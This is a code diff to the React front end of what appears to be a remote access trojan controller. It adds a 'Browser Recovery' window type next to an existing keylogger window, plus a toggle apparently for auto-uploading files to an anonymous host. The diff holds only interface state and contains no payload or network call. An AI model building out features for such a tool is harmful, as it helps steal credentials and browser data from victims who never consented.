@@ -40,6 +40,8 @@ const translateWindowType = (type: string) => {
       return "Input Box";
     case "keylogger":
       return "Keylogger";
+    case "browser-data":
+      return "Browser Recovery";
     default:
       return type;
   }
@@ -86,6 +88,10 @@ const windowTypeSizes = {
     width: 1000,
     height: 700,
   },
+  "browser-data": {
+    width: 1200,
+    height: 800,
+  },
 };
 
 export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
@@ -98,6 +104,7 @@ export const RATProvider: React.FC<RATProviderProps> = ({ children }) => {
   const [selectedClient, setSelectedClient] = useState<string>("");
   const [_clientWindows, setClientWindows] = useState<ClientWindowType[]>([]);
   const [serverLogs, setServerLogs] = useState<Log[]>([]);
+  const [autoUploadAnonFiles, setAutoUploadAnonFiles] = useState<boolean>(false);
 
   async function fetchState() {
     const state: RATState = await fetchStateCmd();
@@ -306,6 +313,8 @@ const openClientWindow = async (
     openClientWindow,
     serverLogs,
     getClientByAddr,
+    autoUploadAnonFiles,
+    setAutoUploadAnonFiles,
   };
 
   return <RATContext.Provider value={RATdata}>{children}</RATContext.Provider>;
